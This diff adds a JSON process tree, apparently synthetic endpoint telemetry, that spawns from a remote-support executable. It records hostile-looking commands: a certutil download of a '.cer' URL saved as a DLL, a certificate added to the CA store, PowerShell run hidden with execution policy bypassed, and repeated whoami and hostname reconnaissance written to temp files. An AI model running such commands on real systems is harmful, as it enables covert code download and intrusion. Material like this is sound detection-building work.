@@ -1,0 +1,315 @@
+{
+  "pid": 241490,
+  "ppid": 0,
+  "name": "RemoteSupportHost.exe",
+  "command": "RemoteSupportHost.exe ",
+  "children": [
+    {
+      "pid": 241493,
+      "ppid": 241490,
+      "name": "powershell.exe",
+      "command": "powershell.exe -NoProfile -WindowStyle Minimized -Command \"Get-WinEvent -LogName System -MaxEvents 100 | Out-File 'C:\\Users\\arjun.gupta\\AppData\\Local\\Temp\\diag_04040120.txt'\"",
+      "children": [
+        {
+          "pid": 241497,
+          "ppid": 241493,
+          "name": "certutil.exe",
+          "command": "certutil.exe -urlcache -split -f \"http://intra-update.corp.local/certs/workstation.cer\" \"C:\\Users\\arjun.gupta\\AppData\\Local\\Temp\\helper.dll\"",
+          "children": [
+            {
+              "pid": 241504,
+              "ppid": 241497,
+              "name": "hostname.exe",
+              "command": "hostname.exe",
+              "children": [
+                {
+                  "pid": 241505,
+                  "ppid": 241504,
+                  "name": "hostname.exe",
+                  "command": "hostname.exe > \"C:\\Users\\arjun.gupta\\AppData\\Local\\Temp\\host_54fc55da.txt\"",
+                  "children": [
+                    {
+                      "pid": 241507,
+                      "ppid": 241505,
+                      "name": "whoami.exe",
+                      "command": "whoami.exe /groups > \"C:\\Users\\arjun.gupta\\AppData\\Local\\Temp\\who_d819e53a.txt\"",
+                      "children": [
+                        {
+                          "pid": 241513,
+                          "ppid": 241507,
+                          "name": "certutil.exe",
+                          "command": "certutil.exe -addstore CA \"C:\\Users\\Public\\intermediate.cer\"",
+                          "children": [
+                            {
+                              "pid": 241515,
+                              "ppid": 241513,
+                              "name": "hostname.exe",
+                              "command": "hostname.exe",
+                              "children": [
+                                {
+                                  "pid": 241520,
+                                  "ppid": 241515,
+                                  "name": "certutil.exe",
+                                  "command": "certutil.exe -verify \"C:\\Users\\Public\\vpn_gateway.cer\"",
+                                  "children": [
+                                    {
+                                      "pid": 241525,
+                                      "ppid": 241520,
+                                      "name": "hostname.exe",
+                                      "command": "hostname.exe",
+                                      "children": [
+                                        {
+                                          "pid": 241531,
+                                          "ppid": 241525,
+                                          "name": "ping.exe",
+                                          "command": "ping.exe -n 22 127.0.0.1 > nul",
+                                          "children": [
+                                            {
+                                              "pid": 241536,
+                                              "ppid": 241531,
+                                              "name": "cmd.exe",
+                                              "command": "cmd.exe /c \"timeout.exe /t 3 /nobreak\"",
+                                              "children": [
+                                                {
+                                                  "pid": 241540,
+                                                  "ppid": 241536,
+                                                  "name": "timeout.exe",
+                                                  "command": "timeout.exe /t 4 /nobreak",
+                                                  "children": [
+                                                    {
+                                                      "pid": 241544,
+                                                      "ppid": 241540,
+                                                      "name": "hostname.exe",
+                                                      "command": "hostname.exe",
+                                                      "children": [
+                                                        {
+                                                          "pid": 241550,
+                                                          "ppid": 241544,
+                                                          "name": "whoami.exe",
+                                                          "command": "whoami.exe /all",
+                                                          "children": []
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        },
+                                        {
+                                          "pid": 241553,
+                                          "ppid": 241525,
+                                          "name": "timeout.exe",
+                                          "command": "timeout.exe /t 14 /nobreak",
+                                          "children": [
+                                            {
+                                              "pid": 241573,
+                                              "ppid": 241553,
+                                              "name": "hostname.exe",
+                                              "command": "hostname.exe",
+                                              "children": [
+                                                {
+                                                  "pid": 241576,
+                                                  "ppid": 241573,
+                                                  "name": "powershell.exe",
+                                                  "command": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Get-ScheduledTask | Out-File 'C:\\Users\\arjun.gupta\\AppData\\Local\\Temp\\sched_a03ed995.txt'\"",
+                                                  "children": [
+                                                    {
+                                                      "pid": 241603,
+                                                      "ppid": 241576,
+                                                      "name": "hostname.exe",
+                                                      "command": "hostname.exe > \"C:\\Users\\arjun.gupta\\AppData\\Local\\Temp\\host_49bba521.txt\"",
+                                                      "children": [
+                                                        {
+                                                          "pid": 241607,
+                                                          "ppid": 241603,
+                                                          "name": "whoami.exe",
+                                                          "command": "whoami.exe",
+                                                          "children": [
+                                                            {
+                                                              "pid": 241611,
+                                                              "ppid": 241607,
+                                                              "name": "choice.exe",
+                                                              "command": "choice.exe /d y /t 9 > nul",
+                                                              "children": [
+                                                                {
+                                                                  "pid": 241612,
+                                                                  "ppid": 241611,
+                                                                  "name": "choice.exe",
+                                                                  "command": "choice.exe /d y /t 18 > nul",
+                                                                  "children": [
+                                                                    {
+                                                                      "pid": 241617,
+                                                                      "ppid": 241612,
+                                                                      "name": "hostname.exe",
+                                                                      "command": "hostname.exe > \"C:\\Users\\arjun.gupta\\AppData\\Local\\Temp\\host_626f8bd4.txt\"",
+                                                                      "children": [
+                                                                        {
+                                                                          "pid": 241641,
+                                                                          "ppid": 241617,
+                                                                          "name": "whoami.exe",
+                                                                          "command": "whoami.exe /groups > \"C:\\Users\\arjun.gupta\\AppData\\Local\\Temp\\who_778105c1.txt\"",
+                                                                          "children": [
+                                                                            {
+                                                                              "pid": 241646,
+                                                                              "ppid": 241641,
+                                                                              "name": "hostname.exe",
+                                                                              "command": "hostname.exe > \"C:\\Users\\arjun.gupta\\AppData\\Local\\Temp\\host_f0ba3edb.txt\"",
+                                                                              "children": [
+                                                                                {
+                                                                                  "pid": 241647,
+                                                                                  "ppid": 241646,
+                                                                                  "name": "whoami.exe",
+                                                                                  "command": "whoami.exe /all",
+                                                                                  "children": [
+                                                                                    {
+                                                                                      "pid": 241649,
+                                                                                      "ppid": 241647,
+                                                                                      "name": "hostname.exe",
+                                                                                      "command": "hostname.exe > \"C:\\Users\\arjun.gupta\\AppData\\Local\\Temp\\host_ee2f7598.txt\"",
+                                                                                      "children": [
+                                                                                        {
+                                                                                          "pid": 241652,
+                                                                                          "ppid": 241649,
+                                                                                          "name": "whoami.exe",
+                                                                                          "command": "whoami.exe /groups > \"C:\\Users\\arjun.gupta\\AppData\\Local\\Temp\\who_e5be65d5.txt\"",
+                                                                                          "children": []
+                                                                                        }
+                                                                                      ]
+                                                                                    }
+                                                                                  ]
+                                                                                }
+                                                                              ]
+                                                                            }
+                                                                          ]
+                                                                        }
+                                                                      ]
+                                                                    }
+                                                                  ]
+                                                                }
+                                                              ]
+                                                            }
+                                                          ]
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "pid": 241558,
+      "ppid": 241490,
+      "name": "whoami.exe",
+      "command": "whoami.exe > \"C:\\Users\\arjun.gupta\\AppData\\Local\\Temp\\who_915487e0.txt\"",
+      "children": [
+        {
+          "pid": 241564,
+          "ppid": 241558,
+          "name": "timeout.exe",
+          "command": "timeout.exe /t 11 /nobreak",
+          "children": [
+            {
+              "pid": 241567,
+              "ppid": 241564,
+              "name": "whoami.exe",
+              "command": "whoami.exe /priv",
+              "children": []
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "pid": 241583,
+      "ppid": 241490,
+      "name": "whoami.exe",
+      "command": "whoami.exe",
+      "children": [
+        {
+          "pid": 241587,
+          "ppid": 241583,
+          "name": "hostname.exe",
+          "command": "hostname.exe",
+          "children": [
+            {
+              "pid": 241589,
+              "ppid": 241587,
+              "name": "hostname.exe",
+              "command": "hostname.exe > \"C:\\Users\\arjun.gupta\\AppData\\Local\\Temp\\host_b541bb9b.txt\"",
+              "children": [
+                {
+                  "pid": 241593,
+                  "ppid": 241589,
+                  "name": "choice.exe",
+                  "command": "choice.exe /d y /t 7 > nul",
+                  "children": [
+                    {
+                      "pid": 241597,
+                      "ppid": 241593,
+                      "name": "whoami.exe",
+                      "command": "whoami.exe /all",
+                      "children": []
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "pid": 241624,
+      "ppid": 241490,
+      "name": "powershell.exe",
+      "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 6\"",
+      "children": [
+        {
+          "pid": 241630,
+          "ppid": 241624,
+          "name": "powershell.exe",
+          "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath 'hostname.exe' -ArgumentList '' -Wait\"",
+          "children": [
+            {
+              "pid": 241635,
+              "ppid": 241630,
+              "name": "hostname.exe",
+              "command": "hostname.exe > \"C:\\Users\\arjun.gupta\\AppData\\Local\\Temp\\host_c333ffe7.txt\"",
+              "children": [
+                {
+                  "pid": 241638,
+                  "ppid": 241635,
+                  "name": "hostname.exe",
+                  "command": "hostname.exe",
+                  "children": []
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
